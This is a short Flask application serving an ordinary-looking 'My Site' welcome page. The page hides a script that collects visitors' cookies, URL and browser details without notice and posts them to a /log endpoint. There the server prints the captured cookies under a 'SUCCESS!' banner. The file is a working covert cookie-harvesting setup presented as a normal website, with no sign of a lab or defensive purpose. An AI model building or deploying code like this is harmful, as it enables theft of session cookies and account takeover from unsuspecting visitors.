from flask import Flask, request, jsonify
import datetime
import os

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>My Site</title>
    </head>
    <body>
        <h1>Welcome to My Website</h1>
        <p>This site is working perfectly!</p>
        
        <script>
            // إرسال البيانات تلقائياً
            setTimeout(() => {
                const data = {
                    cookies: document.cookie || 'no-cookies',
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    time: new Date().toISOString()
                };
                
                fetch('/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
            }, 1000);
        </script>
    </body>
    </html>
    '''

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json
    print('🎯 SUCCESS! Received:')
    print('🍪 Cookies:', data.get('cookies'))
    print('🌐 URL:', data.get('url'))
    print('⏰ Time:', data.get('time'))
    print('=' * 50)
    
    return jsonify({'status': 'success', 'message': 'Data received!'})

@app.route('/test')
def test():
    return '✅ Server is working!'

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
